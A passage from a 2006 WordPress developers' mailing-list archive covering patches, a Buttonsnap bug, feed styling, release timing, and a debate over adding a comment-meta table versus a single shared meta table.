Can anyone provide any reasonings for using the less specific URI term other
than "It's the current fad."? 

If not, I'd support a decision that the next major release include
documentation and code changes required to replace URI with URL. 
From rwh at helms-deep.cable.nu  Wed Apr 12 04:14:41 2006
From: rwh at helms-deep.cable.nu (Robert William Hutton)
Date: Wed Apr 12 04:18:32 2006
Subject: [wp-hackers] [patch] add prev and next links to the comment editing
	page
Message-ID: <443C7EB1.1040803@helms-deep.cable.nu>

Hi All,

I've added ? previous 20 comments | next x comment(s) ? links to the 
comment editing page of wordpress 2.0.2.  Attached is the unified diff 
if this is useful.  The code is smart enough to only show the links when 
they're needed (ie, only when there are more comments to display).

It could probably be refactored slightly so that there is less copy and 
paste code reuse, but it's pretty simple so I'm not so sure it would be 
worthwhile.

Is there a better place than this to submit patches for inclusion in the 
mainline?

Cheers,

Robert
From nuclearmoose at gmail.com  Wed Apr 12 04:27:22 2006
From: nuclearmoose at gmail.com (Craig)
Date: Wed Apr 12 04:31:09 2006
Subject: [wp-hackers] [patch] add prev and next links to the comment
	editing page
In-Reply-To: <443C7EB1.1040803@helms-deep.cable.nu>
References: <443C7EB1.1040803@helms-deep.cable.nu>
Message-ID: <5aa3aa0604112127p732f9b48wc992b576fdecc65@mail.gmail.com>

http://trac.wordpress.org


> Is there a better place than this to submit patches for inclusion in the
> mainline?
>
> Cheers,
>
> Robert
>
From ringmaster at midnightcircus.com  Wed Apr 12 05:44:22 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Apr 12 05:48:29 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
Message-ID: <443C93B6.2080201@midnightcircus.com>

Craig wrote:
> Seen Geo? http://www.redalt.com/downloads/

Geo is just for posts, but it's the same sort of principle.

The trick is that there isn't a good place to store coordinates with 
each comment.  Geo uses the postmeta table to store the coordinates for 
each post.

You could store the coordinates in usermeta, one set per user, but then 
any user you wanted to have coordinate info for would need to be 
registered.  But it doesn't sound like that's what you want.

You could make a more severe hack and add a field or two to the comments 
table to hold the coordinates, which would let you store a coordinate 
for each comment.

Of course, you could wait some more for the plugin author to finish the 
new version, or bug him some more.

Owen

From rwh at helms-deep.cable.nu  Wed Apr 12 08:57:49 2006
From: rwh at helms-deep.cable.nu (Robert William Hutton)
Date: Wed Apr 12 09:01:52 2006
Subject: [wp-hackers] [patch] add prev and next links to the
	comment	editing page
In-Reply-To: <5aa3aa0604112127p732f9b48wc992b576fdecc65@mail.gmail.com>
References: <443C7EB1.1040803@helms-deep.cable.nu>
	<5aa3aa0604112127p732f9b48wc992b576fdecc65@mail.gmail.com>
Message-ID: <443CC10D.9010400@helms-deep.cable.nu>

Thanks.  I have opened a ticket and uploaded the patch.

Cheers,

Robert

Craig wrote:
> http://trac.wordpress.org
> 
> 
>> Is there a better place than this to submit patches for inclusion in the
>> mainline?
>>
>> Cheers,
>>
>> Robert
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From jwvanderbeck at gmail.com  Wed Apr 12 10:21:27 2006
From: jwvanderbeck at gmail.com (John Vanderbeck)
Date: Wed Apr 12 10:25:14 2006
Subject: [wp-hackers] Buttonsnap updates?
Message-ID: <bb0612770604120321h24cd9112g4d6b3c9e2dc4f5f9@mail.gmail.com>

Hey all,

This is my first post to the the list, and my apologies if this isn't list
material.  I tend to just lurk on the list and grab bits of useful
information :)  However I know others use this library as well, and since
this its a singleton this would affect anyone else who uses it in thier
plugin.

Recently I was using buttonsnap to add buttons for my plugin, jPortfolio (
http://www.jwvanderbeck.com/wordpress-plugins/jportfolio/), and ran  into a
bug in the library that prevents the AJAX Filter based button from working
properly under Firefox when using the "basic" editor, not the visual rich
editor.  Upon further research I found that the code was using a javascript
method for getting the selection that is not supported on all browsers
(There is to my knowledge no standard method for getting the selection).  My
research showed the method used mainly only worked on IE based browsers, and
possibly Opera, but not Mozilla based browsers.

I dug around a bit, and rewrote the code to use a combination of methods to
try and get the selection from the browser and now have code that works, as
far as I can tell throguh some quick testing, on all major browsers.  It
worked for me under IE 6, FireFox (Latest), and Opera (Latest).  Since it
works under FireFox it SHOULD also work under Mozilla but I did not test
that.

I was wondering what I would need to do to get this code change rolled into
buttonsnap in some form?  Since this is a singleton class it really needs to
be updated for everyone that uses it or else problems may develop.

Thank you for your time :)

--
- John Vanderbeck
- http://www.jwvanderbeck.com
From ringmaster at midnightcircus.com  Wed Apr 12 11:50:53 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Apr 12 11:55:00 2006
Subject: [wp-hackers] Buttonsnap updates?
In-Reply-To: <bb0612770604120321h24cd9112g4d6b3c9e2dc4f5f9@mail.gmail.com>
References: <bb0612770604120321h24cd9112g4d6b3c9e2dc4f5f9@mail.gmail.com>
Message-ID: <443CE99D.7080505@midnightcircus.com>

John Vanderbeck wrote:
> Recently I was using buttonsnap to add buttons for my plugin, jPortfolio (
> http://www.jwvanderbeck.com/wordpress-plugins/jportfolio/), and ran  into a
> bug in the library that prevents the AJAX Filter based button from working
> properly under Firefox when using the "basic" editor, not the visual rich
> editor.  Upon further research I found that the code was using a javascript
> method for getting the selection that is not supported on all browsers
> (There is to my knowledge no standard method for getting the selection).  My
> research showed the method used mainly only worked on IE based browsers, and
> possibly Opera, but not Mozilla based browsers.

Hmm.  I was using code from the Quicktags plugin, and it seemed to work 
to me, but if you say it doesn't...

> I was wondering what I would need to do to get this code change rolled into
> buttonsnap in some form?  Since this is a singleton class it really needs to
> be updated for everyone that uses it or else problems may develop.

You've sent me this code already, haven't you?  I just need to roll it 
in and test it.  There are another couple of things that I need to 
add/change in Buttonsnap that I'm hoping to do before making a new 
official release.

Owen

From 3stripe at gmail.com  Wed Apr 12 14:28:49 2006
From: 3stripe at gmail.com (James Greig)
Date: Wed Apr 12 14:32:35 2006
Subject: [wp-hackers] Modifying 'Write Post' to show 2 seperate textareas
Message-ID: <5b750c310604120728h498a9f2ap8612e7ae94e19592@mail.gmail.com>

Hi all,

FIrst post here so please excuse any unintentional faux pas...
hopefully this is the right place to ask my question as it seems to be
more complicated than your usual hack...

I'm trying to modify 'Write Page' to include 2 seperate text areas for
some of my pages that have 2 columns, but still only show 1 text area
for normal pages.

Kaf kindly supplied code for this at
http://wordpress.org/support/topic/68137?replies=9

<?php $content = split("<!--nextcolumn-->", $post->post_content); ?>

Would it be possible to modify the Write Page area to match this?

Any ideas much appreicated - normally I wouldn't attempt this but the
site in question is going to be client managed so I think this will
make it much easier for them.

Thanks and best regards

James
From leekelleher at gmail.com  Wed Apr 12 16:26:26 2006
From: leekelleher at gmail.com (Lee Kelleher)
Date: Wed Apr 12 16:30:11 2006
Subject: [wp-hackers] XSL for feeds
In-Reply-To: <a491f91d0604101617x62a749fbhcd8f208f861e6ae0@mail.gmail.com>
References: <4437372D.8030000@robm.me.uk> <44373C61.6080009@szub.net>
	<e6ec604d0604072145r1745d6e7vf8dd952777081942@mail.gmail.com>
	<44376369.5040606@tamba2.org.uk>
	<ebe43d680604080517p5965050v60fe896cf54b6f3f@mail.gmail.com>
	<6453a6e90604101612q7334e78byfdc1530e1cb5aa10@mail.gmail.com>
	<a491f91d0604101617x62a749fbhcd8f208f861e6ae0@mail.gmail.com>
Message-ID: <f791f4670604120926n1d04bb7bs9f44f1bb2c4efefa@mail.gmail.com>

On 11/04/06, Robert Deaton <false.hopes@gmail.com> wrote:
>
> On 4/10/06, Andrew Krespanis <leftjustified@gmail.com> wrote:
> > I must be missing something here... does IE not support styling of XML
> with CSS?
>
> I'm not sure


It does.

There are reasons for XSL over CSS, namely the need for
> transformations of some sort. http://www.w3.org/Style/CSS-vs-XSL


Good article... which basically says "Use CSS when you can, use XSL when you
must."
I don't believe that we MUST use XSL for this, when CSS can do the job well.

I also think that the RSS/Atom feeds should be WordPress branded, not theme
branded (yes, I'm aware theme developers could hack around this, but that's
not a bad thing).  It makes as a good Public Service Announcement from WP
about RSS/Atom.

- Lee Kelleher
From mark.wordpress at txfx.net  Thu Apr 13 07:55:14 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Thu Apr 13 07:59:04 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <443C93B6.2080201@midnightcircus.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
Message-ID: <0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>

On Apr 12, 2006, at 1:44 AM, Owen Winkler wrote:

> The trick is that there isn't a good place to store coordinates  
> with each comment.

Not yet, but I'd really like to get comment meta into WP 2.1 or the  
version after.  Couldn't find a ticket for it, so I made one:

http://trac.wordpress.org/ticket/2659

--
Mark Jaquith
http://txfx.net/


From jwvanderbeck at gmail.com  Thu Apr 13 09:11:00 2006
From: jwvanderbeck at gmail.com (John Vanderbeck)
Date: Thu Apr 13 09:14:49 2006
Subject: [wp-hackers] Buttonsnap updates?
In-Reply-To: <443CE99D.7080505@midnightcircus.com>
References: <bb0612770604120321h24cd9112g4d6b3c9e2dc4f5f9@mail.gmail.com>
	<443CE99D.7080505@midnightcircus.com>
Message-ID: <bb0612770604130211l2fc5713cpfb98e45e6e29efcc@mail.gmail.com>

On 4/12/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> John Vanderbeck wrote:
> > Recently I was using buttonsnap to add buttons for my plugin, jPortfolio (
> > http://www.jwvanderbeck.com/wordpress-plugins/jportfolio/), and ran  into a
> > bug in the library that prevents the AJAX Filter based button from working
> > properly under Firefox when using the "basic" editor, not the visual rich
> > editor.  Upon further research I found that the code was using a javascript
> > method for getting the selection that is not supported on all browsers
> > (There is to my knowledge no standard method for getting the selection).  My
> > research showed the method used mainly only worked on IE based browsers, and
> > possibly Opera, but not Mozilla based browsers.
>
> Hmm.  I was using code from the Quicktags plugin, and it seemed to work
> to me, but if you say it doesn't...

Well it defintly wasn't working for me with Firefox 1.5.0.1 when in
the standard editor.  My hook always received a blank selection no
matter what.

>
> > I was wondering what I would need to do to get this code change rolled into
> > buttonsnap in some form?  Since this is a singleton class it really needs to
> > be updated for everyone that uses it or else problems may develop.
>
> You've sent me this code already, haven't you?  I just need to roll it
> in and test it.  There are another couple of things that I need to
> add/change in Buttonsnap that I'm hoping to do before making a new
> official release.
>

I had posted about the issue in your support forum but I never got any
reply so I didn't know if it was seen or not.  I posted the code I
came up with in there as well.
From r at schestowitz.com  Thu Apr 13 12:07:58 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Thu Apr 13 12:06:31 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
Message-ID: <20060413130758.5cwsyqqfim5w8w8k@banana.catalyst2.com>

___/ On Thu 13 Apr 2006 08:55:14 BST, [ Mark Jaquith ] wrote : \___

> On Apr 12, 2006, at 1:44 AM, Owen Winkler wrote:
>
>> The trick is that there isn't a good place to store coordinates  
>> with each comment.
>
> Not yet, but I'd really like to get comment meta into WP 2.1 or the  
> version after.  Couldn't find a ticket for it, so I made one:
>
> http://trac.wordpress.org/ticket/2659

FWIW, I have tracked down the message which adds some context to this
thread:

http://comox.textdrive.com/pipermail/wp-hackers/2005-November/003213.html

I can recall _at least_ one more thread where the OP requested additional
tables/fields for comments, at which point Geocomments was alluded to.

Best wishes,

Roy

From mark.wordpress at txfx.net  Thu Apr 13 12:18:55 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Thu Apr 13 12:22:51 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
Message-ID: <B15D0267-8758-476A-8466-DCF127F36ADC@txfx.net>

On Apr 13, 2006, at 3:55 AM, Mark Jaquith wrote:

> On Apr 12, 2006, at 1:44 AM, Owen Winkler wrote:
>
>> The trick is that there isn't a good place to store coordinates  
>> with each comment.
>
> Not yet, but I'd really like to get comment meta into WP 2.1 or the  
> version after.

Patch is up: http://trac.wordpress.org/ticket/2659

And yes... I self-quoted.  Deal.
--
Mark Jaquith
http://txfx.net/


From dmhouse at gmail.com  Thu Apr 13 15:15:21 2006
From: dmhouse at gmail.com (David House)
Date: Thu Apr 13 15:19:08 2006
Subject: [wp-hackers] The use of new technical words just because they are
	there.
In-Reply-To: <!~!AAAAADHjbOXNGMFEpRyNlZYQJedE2jIA@TheCodeCave.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<!~!AAAAADHjbOXNGMFEpRyNlZYQJedE2jIA@TheCodeCave.com>
Message-ID: <ebe43d680604130815s2d53af0ei36aba4008f05597c@mail.gmail.com>

> If not, I'd support a decision that the next major release include
> documentation and code changes required to replace URI with URL.

+1. Try filing a bug on trac: http://trac.wordpress.org

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From ringmaster at midnightcircus.com  Thu Apr 13 20:16:35 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Thu Apr 13 20:17:25 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <B15D0267-8758-476A-8466-DCF127F36ADC@txfx.net>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>	<443C93B6.2080201@midnightcircus.com>	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<B15D0267-8758-476A-8466-DCF127F36ADC@txfx.net>
Message-ID: <443EB1A3.9090404@midnightcircus.com>

Mark Jaquith wrote:
> On Apr 13, 2006, at 3:55 AM, Mark Jaquith wrote:
> 
>> On Apr 12, 2006, at 1:44 AM, Owen Winkler wrote:
>>
>>> The trick is that there isn't a good place to store coordinates with 
>>> each comment.
>>
>> Not yet, but I'd really like to get comment meta into WP 2.1 or the 
>> version after.
> 
> Patch is up: http://trac.wordpress.org/ticket/2659

This patch looks really tasty.  If you're looking for something to test, 
please try patching this one.

I dig that meta function rearrangement, Mark.


> And yes... I self-quoted.  Deal.

Yeah, deal.

Owen


From stewart at ugelow.com  Thu Apr 13 21:39:45 2006
From: stewart at ugelow.com (Stewart Ugelow)
Date: Thu Apr 13 21:43:34 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
Message-ID: <7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>

On 4/13/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:

> Not yet, but I'd really like to get comment meta into WP 2.1 or the
> version after.  Couldn't find a ticket for it, so I made one:

Just out of curiousity: why create an entirely new table?

Both usermeta and postmeta right now have a schema of meta_id, foo_id,
meta_key, meta_value. Couldn't we just add a meta_type column and have
a single-bullet solution that covers all future instances of metas?

--Stewart

--

Stewart Ugelow
www.ugelow.com
From davebytes at comcast.net  Thu Apr 13 22:09:01 2006
From: davebytes at comcast.net (David Chait)
Date: Thu Apr 13 22:12:36 2006
Subject: [wp-hackers] geocomments?
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com><5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com><443C93B6.2080201@midnightcircus.com><0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
Message-ID: <004201c65f46$dec46480$6e01a8c0@sixfour>

You do a query on foo ID #234.  Is that comment #234, post #234, user 
#234...?  Three tables as there are three source tables, all with 
overlapping keys...

At least, imho. ;)

-d

----- Original Message ----- 
From: "Stewart Ugelow" <stewart@ugelow.com>
To: <wp-hackers@lists.automattic.com>
Sent: Thursday, April 13, 2006 5:39 PM
Subject: Re: [wp-hackers] geocomments?


On 4/13/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:

> Not yet, but I'd really like to get comment meta into WP 2.1 or the
> version after.  Couldn't find a ticket for it, so I made one:

Just out of curiousity: why create an entirely new table?

Both usermeta and postmeta right now have a schema of meta_id, foo_id,
meta_key, meta_value. Couldn't we just add a meta_type column and have
a single-bullet solution that covers all future instances of metas?

From stewart at ugelow.com  Thu Apr 13 22:39:45 2006
From: stewart at ugelow.com (Stewart Ugelow)
Date: Thu Apr 13 22:43:32 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <004201c65f46$dec46480$6e01a8c0@sixfour>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
	<004201c65f46$dec46480$6e01a8c0@sixfour>
Message-ID: <7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>

Is "SELECT foo_id FROM $wpdb->meta WHERE foo_id = '234' and meta_type
= 'comment'" that much more confusing than "SELECT foo_id FROM
$wpdb->commentmeta WHERE foo_id = '234'" ?

Otherwise we're going to end up with tables (and associated handler
functions) for categorymeta, tagmeta, geometa, and even metameta in
the near future. :)

--Stewart

On 4/13/06, David Chait <davebytes@comcast.net> wrote:
> You do a query on foo ID #234.  Is that comment #234, post #234, user
> #234...?  Three tables as there are three source tables, all with
> overlapping keys...
>
> At least, imho. ;)
>
> -d
>
> ----- Original Message -----
> From: "Stewart Ugelow" <stewart@ugelow.com>
> To: <wp-hackers@lists.automattic.com>
> Sent: Thursday, April 13, 2006 5:39 PM
> Subject: Re: [wp-hackers] geocomments?
>
>
> On 4/13/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
>
> > Not yet, but I'd really like to get comment meta into WP 2.1 or the
> > version after.  Couldn't find a ticket for it, so I made one:
>
> Just out of curiousity: why create an entirely new table?
>
> Both usermeta and postmeta right now have a schema of meta_id, foo_id,
> meta_key, meta_value. Couldn't we just add a meta_type column and have
> a single-bullet solution that covers all future instances of metas?
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From ringmaster at midnightcircus.com  Thu Apr 13 22:50:56 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Thu Apr 13 22:55:17 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
	<004201c65f46$dec46480$6e01a8c0@sixfour>
	<7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>
Message-ID: <443ED5D0.4080502@midnightcircus.com>

Stewart Ugelow wrote:
> Otherwise we're going to end up with tables (and associated handler
> functions) for categorymeta, tagmeta, geometa, and even metameta in
> the near future. :)

All of which is more efficient than querying against a single table with 
an extra WHERE parameter, indexed or not.

Owen
From false.hopes at gmail.com  Thu Apr 13 22:52:39 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Thu Apr 13 22:56:26 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
	<004201c65f46$dec46480$6e01a8c0@sixfour>
	<7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>
Message-ID: <a491f91d0604131552x409c03aen8aec7d680b0394d@mail.gmail.com>

On 4/13/06, Stewart Ugelow <stewart@ugelow.com> wrote:
> Is "SELECT foo_id FROM $wpdb->meta WHERE foo_id = '234' and meta_type
> = 'comment'" that much more confusing than "SELECT foo_id FROM
> $wpdb->commentmeta WHERE foo_id = '234'" ?
>

We lose the benefit of unique keys and speed. Not a worthy tradeoff to me.

--
--Robert Deaton
http://somethingunpredictable.com
From kaf at szub.net  Thu Apr 13 23:24:29 2006
From: kaf at szub.net (Kaf Oseo)
Date: Thu Apr 13 23:28:15 2006
Subject: [wp-hackers] Congrats
Message-ID: <443EDDAD.2040308@szub.net>

http://photomatt.net/2006/04/12/a-little-funding/

Not all that wp-hacker-related, but good work guys. Glad to see things
are balancing out for the Automattic team.

And congrats to Podz for joining that team. Speaking of which:

http://wordpress.org/support/topic/68664

"When you make a request here for help, no-one is being paid to
answer you."

This is out of date. ;)

-Kaf
From stewart at ugelow.com  Thu Apr 13 23:46:09 2006
From: stewart at ugelow.com (Stewart Ugelow)
Date: Thu Apr 13 23:50:00 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <443ED5D0.4080502@midnightcircus.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
	<004201c65f46$dec46480$6e01a8c0@sixfour>
	<7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>
	<443ED5D0.4080502@midnightcircus.com>
Message-ID: <7c94a5850604131646r37c950dfkb67316c5d810d6be@mail.gmail.com>

> All of which is more efficient than querying against a single table with
> an extra WHERE parameter, indexed or not.

Really? Even if it's a multi-column index as described at
http://dev.mysql.com/doc/refman/4.1/en/multiple-column-indexes.html?

And doesn't Mark's patch already have multiple where clauses in the
wp_get_meta() functions?

$metalist = $wpdb->get_results("SELECT meta_value FROM $table WHERE
$id_col = '$id' AND meta_key = '$key'", ARRAY_N);

--Stewart, who is not not trying to beat a dead horse but is genuinely curious.

--

Stewart Ugelow
www.ugelow.com
From wp at ebroder.net  Fri Apr 14 01:23:27 2006
From: wp at ebroder.net (Evan Broder)
Date: Fri Apr 14 01:26:36 2006
Subject: [wp-hackers] Release Cycle
Message-ID: <443EF98F.6040602@ebroder.net>

The last time the release cycle came up, it was noted that estimated 
release dates were listed on the Trac Roadmap. However, I'm noticing now 
that there are no dates set for 2.1 or 2.5 (or some non-existent 2.0.3).

With the separation of post_type and post_status, comment_meta, and all 
kinds of other goodness, I'm really excited about getting the next 
version, but I don't want to run SVN trunk in a production environment.

WP 2.0, 2.0.1, and 2.0.2 were each separated by about a month, so 
following the cycle, shouldn't a new release be coming out soon?

- Evan
From ringmaster at midnightcircus.com  Fri Apr 14 01:56:33 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Apr 14 02:00:44 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <7c94a5850604131646r37c950dfkb67316c5d810d6be@mail.gmail.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
	<004201c65f46$dec46480$6e01a8c0@sixfour>
	<7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>
	<443ED5D0.4080502@midnightcircus.com>
	<7c94a5850604131646r37c950dfkb67316c5d810d6be@mail.gmail.com>
Message-ID: <443F0151.2060000@midnightcircus.com>

Stewart Ugelow wrote:
>> All of which is more efficient than querying against a single table with
>> an extra WHERE parameter, indexed or not.
> 
> Really? Even if it's a multi-column index as described at
> http://dev.mysql.com/doc/refman/4.1/en/multiple-column-indexes.html?

Yeah.  Think of it like this:

You're having a party and are putting drinks in coolers.  Is it easier 
to find a bottled Guiness in a cooler that contains only beer, or in a 
container that contains all varieties of beer and soda?

Even if you kind of segregate the bottles in a single cooler (use an 
index), people shuffling the bottles around as they are added and 
removed requires that they either be re-segregated periodically or that 
a less efficient search be employed later in the party.  No matter how 
well the bottles are organized, it's still going to be easier to choose 
the correct one of two coolers to get the right type of beverage than to 
store all the drinks in one place.

> And doesn't Mark's patch already have multiple where clauses in the
> wp_get_meta() functions?
> 
> $metalist = $wpdb->get_results("SELECT meta_value FROM $table WHERE
> $id_col = '$id' AND meta_key = '$key'", ARRAY_N);

Yes, but that's the minimum number (2) of required WHERE elements to get 
the job done.  If you split either of those values off as a new table, 
you'd end up with a variable number of tables, which would be less 
efficient than using one for each matching table.

Even though you might have a composite index, which might improve the 
lookup, it would still have to index on three fields.

Whatever marginal gain you might be able to eek out of the whole mess, 
you instantly kill it by what development time it takes to debug stuff 
related to these tables when it isn't working right.  ;)

Owen



From false.hopes at gmail.com  Fri Apr 14 02:08:34 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Apr 14 02:12:27 2006
Subject: [wp-hackers] Release Cycle
In-Reply-To: <443EF98F.6040602@ebroder.net>
References: <443EF98F.6040602@ebroder.net>
Message-ID: <a491f91d0604131908v397e4d87u5bd435698618fd85@mail.gmail.com>

On 4/13/06, Evan Broder <wp@ebroder.net> wrote:
> The last time the release cycle came up, it was noted that estimated
> release dates were listed on the Trac Roadmap. However, I'm noticing now
> that there are no dates set for 2.1 or 2.5 (or some non-existent 2.0.3).
>
> With the separation of post_type and post_status, comment_meta, and all
> kinds of other goodness, I'm really excited about getting the next
> version, but I don't want to run SVN trunk in a production environment.
>
> WP 2.0, 2.0.1, and 2.0.2 were each separated by about a month, so
> following the cycle, shouldn't a new release be coming out soon?

Those were all bugfix/security releases on the 2.0 branch, development
has started on a new branch, look at the time differences between 1.2
-> 1.5, 1.5 -> 2.0, and you'll probably have a more accurate picture
of when a new release will be coming (its a while off, most likely).

--
--Robert Deaton
http://somethingunpredictable.com
From stewart at ugelow.com  Fri Apr 14 03:45:52 2006
From: stewart at ugelow.com (Stewart Ugelow)
Date: Fri Apr 14 03:49:40 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <443F0151.2060000@midnightcircus.com>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
	<004201c65f46$dec46480$6e01a8c0@sixfour>
	<7c94a5850604131539l47d89fd7p9dd716c67ac3f43b@mail.gmail.com>
	<443ED5D0.4080502@midnightcircus.com>
	<7c94a5850604131646r37c950dfkb67316c5d810d6be@mail.gmail.com>
	<443F0151.2060000@midnightcircus.com>
Message-ID: <7c94a5850604132045j4a6e7ce2o68be7405398aed00@mail.gmail.com>

On 4/13/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> Stewart Ugelow wrote:
> >> All of which is more efficient than querying against a single table with
> >> an extra WHERE parameter, indexed or not.
> >
> > Really? Even if it's a multi-column index as described at
> > http://dev.mysql.com/doc/refman/4.1/en/multiple-column-indexes.html?
>
> Yeah.  Think of it like this:
>
> You're having a party and are putting drinks in coolers.  Is it easier
> to find a bottled Guiness in a cooler that contains only beer, or in a
> container that contains all varieties of beer and soda?
>
> Even if you kind of segregate the bottles in a single cooler (use an
> index), people shuffling the bottles around as they are added and
> removed requires that they either be re-segregated periodically or that
> a less efficient search be employed later in the party.  No matter how
> well the bottles are organized, it's still going to be easier to choose
> the correct one of two coolers to get the right type of beverage than to
> store all the drinks in one place.

So what happens if you have your two coolers of beer and soda and then
your friend shows up at your party with a case of iced tea?

You have to file a trac ticket asking Matt or Ryan for permission to
buy another cooler, everyone at the party gets to comment about
whether iced tea is an essential beverage to the party core, and you
have to write a whole new set of instructions on where the iced tea is
located and what the process is for grabbing one if you want one. Then
those instructions have to be maintained and updated every time you
throw a party going forward.

The whole process can be a real mess. Just ask the guy who wrote
http://www.asymptomatic.net/2006/01/17/2216/no-more-feeds-for-wordpress/.

> > And doesn't Mark's patch already have multiple where clauses in the
> > wp_get_meta() functions?
> >
> > $metalist = $wpdb->get_results("SELECT meta_value FROM $table WHERE
